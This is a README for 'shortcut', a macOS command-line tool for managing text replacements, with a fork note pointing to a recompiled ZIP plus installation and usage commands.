## NOTE: Modified to deconflict with macOS shortcuts in /usr/bin.

I uploaded a ZIP file called [shortcut-2.0.0.zip](https://github.com/swmeyer1979/shortcut/blob/master/shortcut-2.0.0.zip) in which I replaced all _shortcut_ to _shortcut_ and recompiled. Just download [shortcut-2.0.0.zip](https://github.com/swmeyer1979/shortcut/blob/master/shortcut-2.0.0.zip) and put it into _/usr/local/bin_ or any other suitable location.

# shortcut - a command line interface to your text replacements on macOS

This simple utility allows you to view, update, create and delete text substitutions used in Cocoa-based applications.
 
## ⚠️ Compatibility Warning

`shortcut` is built on top of macOS' private APIs (InputMethodKit.framework for 10.11, KeyboardServices.framework for 10.12+) so any OS update (especially a major one) could break the utility. If this ever happens I'll try my best to fix it as soon as possible, so stay tuned! 

There're two branches in this repo: [`v1.x`](https://github.com/rodionovd/shortcut/tree/1.x/for-el-capitan) for El Capitan (10.11) and [`master`](https://github.com/rodionovd/shortcut/tree/master) for Sierra (10.12) and High Sierra (10.13). The former is in maintaince mode mostly so it won't receive any new features (but I'll try to backport bug fixes from `master`, so don't worry).

If you're installing `shortcut` via Homebrew the appropriate version is installed automatically based on your macOS revision. 


## Installation

You can install shortcut with [Homebrew](http://brew.sh):

```shell
$ brew install rodionovd/taps/shortcut
```

> Please note that you'll need Xcode in order to compile the project. If you don't use Xcode, [download a pre-built binary](https://github.com/rodionovd/shortcut/releases) and put it into `/usr/local/bin/` or any other suitable location.

## Usage

### Listing all text replacements

```shell
$ shortcut read [--as-plist]
```

You can specify `--as-plist` modifier to generate a property list file suitable for dragging into Keyboard Preferences Pane (see [How to export and import text substitutions in OS X](https://support.apple.com/en-au/HT204006) for details). 

### Importing new entries 

You can import new text replacement entries either from a property list (see above)

```shell
$ shortcut import [--force] /path/to/input.plist
```

or manully like this


```shell
$ shortcut create [--force] <shortcut> <phrase>
```

The default conflict resolution strategy is that the existing entries will not be overwritten with those from the input file/command line. You should use the `--force` flag to update existing entries (i.e. for the same `<shortcut>`).


### Updating shortcut

As simple as

```shell
$ shortcut update <shortcut> <new phrase>
```

Currently this command is an alias for the `create --force` command.

### Deleting shortcut

```shell
$ shortcut delete <shortcut>
```

Well that's it.

------

Made by [Internals Exposed](http://internals.exposed) @ 2016-2018.
